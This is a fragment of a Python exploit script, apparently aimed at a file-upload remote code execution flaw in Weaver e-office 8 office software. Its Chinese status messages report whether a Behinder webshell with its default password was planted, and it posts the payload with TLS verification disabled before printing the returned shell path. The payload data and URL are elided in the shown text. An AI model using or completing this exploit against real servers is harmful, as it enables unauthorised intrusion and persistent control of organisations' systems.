...
def main(target_url):
    ...
    success_msg = now_time() + '[SUCCESS]泛微文件上传漏洞存在,冰蝎默认密码'
    warning_msg1 = now_time() + '[WARNING]泛微weaveroa-eoffice8-upload-RCE漏洞payload执行成功，但木马检测失败'
    warning_msg2 = now_time() + '[WARNING]泛微weaveroa-eoffice8-upload-RCE不存在'
    error_msg = now_time() + '[eaveroa-eoffice8-upload-RCE][ERROR]代码异常，或无法连接目标'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        shell_msg = now_time() + '[SUCCESS]路径存在再返回值中：{}'.format(upload.text)
